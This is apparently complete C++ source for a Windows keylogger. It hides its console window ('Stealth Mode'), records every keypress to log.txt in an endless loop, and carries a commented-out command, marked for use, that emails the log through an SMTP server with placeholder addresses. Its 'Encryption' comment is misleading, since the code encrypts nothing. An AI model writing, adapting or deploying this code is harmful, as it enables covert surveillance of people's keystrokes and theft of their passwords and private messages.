#include <iostream>
#include <fstream>
#include <Windows.h>
using namespace std;

int main()
{
    //Stealth Mode
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    //Encryption
    char key;
    while (1)
    {
        for (key = 8; key <= 222; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                fstream logFile;
                logFile.open("log.txt", ios::app);
                logFile << key;
                logFile.close();
                logFile.open("log.txt", ios::app | ios::binary);
                logFile << key;
                logFile.close();
                //Sending log file to email uncomment for usage
                //system("sendemail -f sender@example.com -t recipient@example.com -u 'Keylogger log' -m 'Attached is the log file' -a log.txt -s smtp.example.com:587 -xu username -xp password");
            }
        }
    }
    return 0;
}
